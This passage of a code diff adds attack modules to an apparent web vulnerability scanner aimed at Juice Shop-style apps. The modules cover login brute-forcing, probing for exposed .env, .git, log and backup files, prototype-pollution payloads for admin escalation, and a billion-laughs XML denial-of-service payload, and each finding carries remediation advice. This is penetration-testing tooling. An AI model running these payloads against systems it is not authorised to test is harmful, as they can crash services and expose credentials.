+                            url, True,
+                            "Enforce strong password policy. Rotate all default credentials. "
+                            "Implement account lockout after failed attempts.",
+                            confidence="high")
+                        break  # found one set, move on
+                except Exception:
+                    pass
+        except httpx.HTTPError:
+            pass
+        await asyncio.sleep(0)
+
+    # Test for missing account lockout (brute-force protection)
+    failed_count = 0
+    test_user = WEAK_CREDENTIAL_PAIRS[0][0]
+    for i in range(5):
+        try:
+            r = await client.post(url, json={user_field: test_user, pass_field: f"wrongpass{i}"}, timeout=6)
+            if r.status_code not in (429, 423, 403):
+                failed_count += 1
+        except httpx.HTTPError:
+            break
+        await asyncio.sleep(0.1)
+
+    if failed_count >= 5:
+        yield _finding("broken_auth", "no_lockout", "medium",
+            "No Account Lockout / Rate Limiting Detected",
+            f"Sent 5 consecutive failed login attempts to {url} without triggering "
+            f"lockout (429) or account lock (423). Brute-force attacks are possible.",
+            f"Endpoint: {url}\n5 failed attempts all returned non-429/423 responses",
+            url, True,
+            "Implement account lockout or exponential backoff after N failed attempts. "
+            "Use CAPTCHA for login endpoints. Consider IP-based rate limiting.",
+            confidence="medium")
+
+    # Test password reset — verify link expiry
+    reset_paths = ["/forgot-password", "/api/forgot-password", "/rest/user/reset-password"]
+    for path in reset_paths[:2]:
+        reset_url = target + path
+        try:
+            r = await client.post(reset_url, json={"email": test_user}, timeout=6)
+            if r.status_code in (200, 201, 204):
+                yield _finding("broken_auth", "password_reset_active", "info",
+                    f"Password Reset Endpoint Active: {path}",
+                    f"POST {reset_url} returned {r.status_code} — password reset mechanism is active. "
+                    f"Verify reset tokens expire, are single-use, and reset emails go to correct address only.",
+                    f"Endpoint: {reset_url}\nStatus: {r.status_code}",
+                    reset_url, False,
+                    "Ensure reset tokens: (1) expire within 15 minutes, (2) are invalidated after use, "
+                    "(3) are cryptographically random, (4) sent only to the registered email.",
+                    confidence="low")
+                break
+        except httpx.HTTPError:
+            pass
+
+
+# ── Module: Information Disclosure ───────────────────────────────────────────
+
+async def _module_info_disclosure(target: str, client: httpx.AsyncClient,
+                                   spa_fallback_size: int = 0) -> AsyncGenerator[dict, None]:
+    """Probe for exposed sensitive files: FTP dir, backups, .env, git, logs."""
+
+    for path in INFO_DISCLOSURE_PATHS:
+        url = target + path
+        try:
+            r = await client.get(url, timeout=8)
+            if _is_spa_fallback(r, spa_fallback_size):
+                continue
+            if r.status_code == 200 and len(r.content) > 20:
+                body = r.text
+                body_lower = body.lower()
+
+                # Check for FTP directory listing
+                if path in ("/ftp", "/ftp/"):
+                    if any(f in body for f in ["acquisitions", "package.json", "legal", "bak", "eastere"]):
+                        yield _finding("info_disclosure", "ftp_directory_exposed", "high",
+                            "FTP Directory Listing Exposed",
+                            f"GET {url} returns a directory listing with sensitive files. "
+                            f"Confidential documents, backups, and developer files are accessible.",
+                            f"URL: {url}\nFiles visible: {body[:400]}",
+                            url, True,
+                            "Remove the /ftp directory from web root or restrict access. "
+                            "Never store sensitive documents in publicly accessible directories.",
+                            confidence="high")
+                    continue
+
+                # Check for specific sensitive file indicators
+                if path.endswith(".bak") or path.endswith("~") or path.endswith(".old"):
+                    yield _finding("info_disclosure", "backup_file_exposed", "high",
+                        f"Backup/Source File Exposed: {path}",
+                        f"Backup file at {url} is publicly accessible. May contain source code, "
+                        f"credentials, or configuration secrets.",
+                        f"URL: {url}\nSize: {len(r.content)} bytes\nPreview: {body[:200]}",
+                        url, True,
+                        "Remove backup files from the web root. Use .gitignore and deployment pipelines "
+                        "to ensure backup files are never deployed.",
+                        confidence="high")
+                    continue
+
+                if path == "/.env" or "/.env." in path:
+                    sensitive_keys = [k for k in
+                        ["DB_PASSWORD", "SECRET_KEY", "API_KEY", "DATABASE_URL", "REDIS_URL",
+                         "SMTP_PASSWORD", "AWS_SECRET", "STRIPE_KEY"]
+                        if k in body or k.lower() in body_lower]
+                    yield _finding("info_disclosure", "env_file_exposed", "critical",
+                        ".env File Exposed — Credentials Leaked",
+                        f"The .env file at {url} is publicly accessible. "
+                        + (f"Detected sensitive keys: {sensitive_keys}." if sensitive_keys else "May contain secrets."),
+                        f"URL: {url}\nSensitive keys found: {sensitive_keys}\nPreview: {body[:300]}",
+                        url, True,
+                        "Never commit or deploy .env files to web-accessible directories. "
+                        "Use environment variables injected at runtime via secrets management.",
+                        confidence="high")
+                    continue
+
+                if path in ("/.git/config", "/.git/HEAD", "/.git/COMMIT_EDITMSG"):
+                    yield _finding("info_disclosure", "git_exposed", "high",
+                        f"Git Repository Metadata Exposed: {path}",
+                        f"Git file at {url} is publicly accessible. "
+                        f"Full source code may be reconstructable from the .git directory.",
+                        f"URL: {url}\nContent: {body[:200]}",
+                        url, True,
+                        "Block access to the .git directory via web server config. "
+                        "Add `deny all` for /.git/ in nginx/Apache.",
+                        confidence="high")
+                    continue
+
+                if path in ("/access.log", "/error.log", "/logs/access.log") or "access.log" in path:
+                    if any(ind in body for ind in ["GET /", "POST /", "HTTP/1.1"]):
+                        yield _finding("info_disclosure", "log_file_exposed", "high",
+                            f"Server Log File Exposed: {path}",
+                            f"Server access log at {url} is publicly accessible. "
+                            f"Internal paths, user IPs, and request details are exposed.",
+                            f"URL: {url}\nPreview: {body[:300]}",
+                            url, True,
+                            "Store logs outside the web root. Restrict access to log files.",
+                            confidence="high")
+                    continue
+
+                if path == "/robots.txt":
+                    # Robots.txt can reveal hidden paths
+                    disallowed = [line.split(":", 1)[1].strip() for line in body.split("\n")
+                                  if line.lower().startswith("disallow:")]
+                    if disallowed:
+                        yield _finding("info_disclosure", "robots_disallowed_paths", "info",
+                            "robots.txt Reveals Hidden Paths",
+                            f"robots.txt at {url} lists {len(disallowed)} Disallowed path(s). "
+                            f"These paths are worth investigating for sensitive content.",
+                            f"URL: {url}\nDisallowed paths: {disallowed[:10]}",
+                            url, False,
+                            "Review all Disallowed paths in robots.txt for sensitive content. "
+                            "robots.txt is public — do not use it to hide sensitive endpoints.",
+                            confidence="low")
+                    continue
+
+                if path == "/.well-known/security.txt":
+                    yield _finding("info_disclosure", "security_txt_present", "info",
+                        "security.txt Found",
+                        f"Security policy file at {url} is present. Contains contact info for reporting vulnerabilities.",
+                        f"URL: {url}\nContent: {body[:200]}",
+                        url, False,
+                        "Good security practice. Ensure the contact information is current.",
+                        confidence="low")
+                    continue
+
+                # Generic: sensitive file accessible
+                indicators = INFO_DISCLOSURE_INDICATORS.get(path, [])
+                if indicators and any(ind in body for ind in indicators):
+                    yield _finding("info_disclosure", "sensitive_file_exposed", "high",
+                        f"Sensitive File Exposed: {path}",
+                        f"File at {url} is publicly accessible and contains sensitive data.",
+                        f"URL: {url}\nSize: {len(r.content)} bytes\nPreview: {body[:200]}",
+                        url, True,
+                        "Remove sensitive files from the web root. Use deployment pipelines "
+                        "to prevent secrets and config files from being deployed publicly.",
+                        confidence="medium")
+
+            elif r.status_code == 403:
+                # 403 means the file exists but is blocked — still worth noting for critical paths
+                if path in ("/.env", "/.git/config", "/.htpasswd"):
+                    yield _finding("info_disclosure", "sensitive_path_blocked", "info",
+                        f"Sensitive Path Exists but Blocked: {path}",
+                        f"GET {url} returned 403. The path exists — verify the block is complete "
+                        f"(not bypassable via path traversal or method override).",
+                        f"URL: {url}\nStatus: 403",
+                        url, False,
+                        "Ensure the block cannot be bypassed. Test with X-Original-URL, "
+                        "X-Rewrite-URL, and path traversal variants.",
+                        confidence="low")
+
+        except httpx.HTTPError:
+            pass
+        await asyncio.sleep(0)
+
+    # Test for specific Juice Shop files via direct GET
+    juice_files = [
+        ("/ftp/acquisitions.md", "confidential", "Acquisitions document found in /ftp"),
+        ("/ftp/eastere.gg", "L2d1ci9xcmlmL25lci9mYi9zaGFhbC9ndXJsL3V2cS9uYS9ybWxoL2x3ZWo=", "Juice Shop Easter Egg file"),
+        ("/ftp/coupons_2013.md.bak", "coupon", "Forgotten sales backup with coupon codes"),
+        ("/ftp/package.json.bak", '"juiceshop"', "Developer forgot package.json backup in FTP"),
+    ]
+    for path, indicator, description in juice_files:
+        try:
+            r = await client.get(target + path, timeout=6)
+            if r.status_code == 200 and (indicator in r.text or len(r.content) > 10):
+                yield _finding("info_disclosure", "forgotten_file_" + path.split("/")[-1].replace(".", "_"),
+                    "high", f"Forgotten File Exposed: {path}",
+                    description + f". File is publicly accessible without authentication.",
+                    f"URL: {target + path}\nSize: {len(r.content)} bytes\nPreview: {r.text[:200]}",
+                    target + path, True,
+                    "Remove all sensitive files from the /ftp and similar public directories. "
+                    "Audit web-accessible directories regularly.",
+                    confidence="high")
+        except httpx.HTTPError:
+            pass
+        await asyncio.sleep(0)
+
+
+# ── Module: Insecure Deserialization ─────────────────────────────────────────
+
+async def _module_deserialization(target: str, client: httpx.AsyncClient,
+                                   forms: list[dict]) -> AsyncGenerator[dict, None]:
+    """Test for insecure deserialization, prototype pollution, and zip/XML bombs."""
+
+    # Test 1: Prototype pollution via JSON body
+    prototype_test_endpoints = [
+        "/api/users", "/api/register", "/api/v1/users",
+        "/api/profile", "/api/settings",
+        "/rest/user/login",
+    ]
+    for path in prototype_test_endpoints[:4]:
+        url = target + path
+        for payload in PROTOTYPE_POLLUTION_PAYLOADS[:3]:
+            if not isinstance(payload, dict):
+                continue
+            try:
+                r = await client.post(url, json=payload, timeout=8)
+                if r.status_code in (200, 201):
+                    try:
+                        data = r.json()
+                        if isinstance(data, dict):
+                            if data.get("isAdmin") or data.get("role") == "admin" or data.get("admin"):
+                                yield _finding("deserialization", "prototype_pollution_admin", "critical",
+                                    f"Prototype Pollution — Admin Privilege Escalation via {path}",
+                                    f"POST {url} with `{payload}` returned admin=true or isAdmin=true. "
+                                    f"Prototype pollution can overwrite global object properties.",
+                                    f"URL: {url}\nPayload: {payload}\nResponse: {str(data)[:200]}",
+                                    url, True,
+                                    "Freeze Object.prototype in Node.js: `Object.freeze(Object.prototype)`. "
+                                    "Use JSON schema validation to reject __proto__ keys.",
+                                    confidence="medium")
+                    except Exception:
+                        pass
+            except httpx.HTTPError:
+                pass
+            await asyncio.sleep(0)
+
+    # Test 2: Prototype pollution via URL query params
+    for path in prototype_test_endpoints[:2]:
+        url = target + path
+        for pp_param in PROTOTYPE_POLLUTION_PAYLOADS:
+            if isinstance(pp_param, str):
+                try:
+                    r = await client.get(f"{url}?{pp_param}", timeout=6)
+                    if r.status_code == 200:
+                        try:
+                            data = r.json()
+                            if isinstance(data, dict) and (data.get("isAdmin") or data.get("role") == "admin"):
+                                yield _finding("deserialization", "prototype_pollution_url", "high",
+                                    "Prototype Pollution via URL Query Parameter",
+                                    f"URL query parameter `{pp_param}` caused prototype pollution. "
+                                    f"Response indicates admin privileges were granted.",
+                                    f"URL: {url}?{pp_param}\nResponse: {str(data)[:200]}",
+                                    url, True,
+                                    "Sanitize URL query parameters. Reject keys containing __proto__ or constructor.",
+                                    confidence="medium")
+                        except Exception:
+                            pass
+                except httpx.HTTPError:
+                    pass
+                await asyncio.sleep(0)
+
+    # Test 3: XML billion laughs via B2B endpoint
+    billion_laughs = """<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+]>
+<root>&lol4;</root>"""
+    b2b_url = target + "/b2b/v2/orders"
+    try:
+        r = await asyncio.wait_for(
+            client.post(b2b_url,
+                content=billion_laughs.encode(),
+                headers={"Content-Type": "application/xml"}),
+            timeout=3.0
+        )
+        if r.status_code not in (404, 405, 501):
+            yield _finding("deserialization", "xml_billion_laughs_endpoint", "high",
+                "B2B Endpoint May Accept Billion Laughs XML DoS",
+                f"POST {b2b_url} returned {r.status_code} for XML input. "
+                f"If the XML parser processes entity expansion, a billion laughs attack "
+                f"can cause CPU/memory exhaustion.",
+                f"URL: {b2b_url}\nStatus: {r.status_code}",
+                b2b_url, True,
+                "Set entity expansion limits in XML parser. "
+                "Use FEATURE_SECURE_PROCESSING in Java. Limit entity depth to 1-2 levels.",
+                confidence="low")
+    except asyncio.TimeoutError:
+        # Timeout means the server hung processing the entity expansion
+        yield _finding("deserialization", "xml_dos_confirmed", "critical",
+            "XML DoS (Billion Laughs) Confirmed at B2B Endpoint",
+            f"POST {b2b_url} with billion laughs XML payload caused the server to hang "
+            f"(no response within 3s). CPU/memory exhaustion DoS is exploitable.",
+            f"URL: {b2b_url}\nPayload: XML with 4-level entity expansion\n"
+            f"Evidence: Server did not respond within 3 seconds",
+            b2b_url, True,
+            "Disable entity expansion in XML parser. Set expansion limit to 1. "
+            "Use XMLConstants.FEATURE_SECURE_PROCESSING.",
+            confidence="high")
+    except Exception:
+        pass
+
+
 # ── Main Stream ───────────────────────────────────────────────────────────────
 
 async def _stream_attack_suite(scan_id: str, req: AttackSuiteRequest) -> AsyncGenerator[str, None]:
@@ -1789,11 +2801,48 @@ async def _stream_attack_suite(scan_id: str, req: AttackSuiteRequest) -> AsyncGe
         # ── Second account client ──────────────────────────────────────────
         client2: Optional[httpx.AsyncClient] = None
         if req.account2.enabled:
-            acc2_headers = {}
+            acc2_headers: dict[str, str] = {}
             if req.account2.bearer_token:
                 acc2_headers["Authorization"] = f"Bearer {req.account2.bearer_token}"
             elif req.account2.cookie:
                 acc2_headers["Cookie"] = req.account2.cookie
+            elif req.account2.login_type == "rest_json" and req.account2.login_url and req.account2.username:
+                # REST JSON login for second account
+                try:
+                    acc2_cfg = LoginConfig(
+                        enabled=True,
+                        login_url=req.account2.login_url,
+                        username=req.account2.username,
+                        password=req.account2.password,
+                        login_type="rest_json",
+                        token_path=req.account2.token_path,
+                    )
+                    acc2_auth = await _perform_login(client, acc2_cfg, req.target)
+                    if acc2_auth:
+                        acc2_headers.update(acc2_auth)
+                        yield _sse("progress", {
+                            "message": f"✅ Account 2 login successful (REST JSON).",
+                            "module": "login"
+                        })
+                    else:
+                        yield _sse("progress", {"message": "⚠️ Account 2 login failed — no token returned.", "module": "login"})
+                except Exception as e:
+                    yield _sse("progress", {"message": f"Account 2 login error: {e}", "module": "login"})
+            elif req.account2.login_type == "form" and req.account2.login_url and req.account2.username:
+                try:
+                    acc2_cfg = LoginConfig(
+                        enabled=True,
+                        login_url=req.account2.login_url,
+                        username=req.account2.username,
+                        password=req.account2.password,
+                        login_type="form",
+                    )
+                    acc2_auth = await _perform_login(client, acc2_cfg, req.target)
+                    if acc2_auth:
+                        acc2_headers.update(acc2_auth)
+                except Exception:
+                    pass
+
             if acc2_headers:
                 client2 = httpx.AsyncClient(headers={**headers, **acc2_headers},
                                              timeout=_timeout, verify=False)
@@ -1883,6 +2932,13 @@ async def _stream_attack_suite(scan_id: str, req: AttackSuiteRequest) -> AsyncGe
             "redirect":  lambda: _module_redirect(req.target, client),
             "auth_bypass": lambda: _module_auth_bypass(req.target, client, spa_fallback_size),
             "takeover":  lambda: _module_takeover(req.target, client),
+            "nosql":        lambda: _module_nosql(req.target, client, crawl_result.forms),
+            "ssti":         lambda: _module_ssti(req.target, client, crawl_result.forms),
+            "xxe":          lambda: _module_xxe(req.target, client),
+            "file_upload":  lambda: _module_file_upload(req.target, client, spa_fallback_size),
+            "broken_auth":  lambda: _module_broken_auth(req.target, client),
+            "info_disclosure": lambda: _module_info_disclosure(req.target, client, spa_fallback_size),
+            "deserialization": lambda: _module_deserialization(req.target, client, crawl_result.forms),
         }
 
         for mod_id in req.modules:
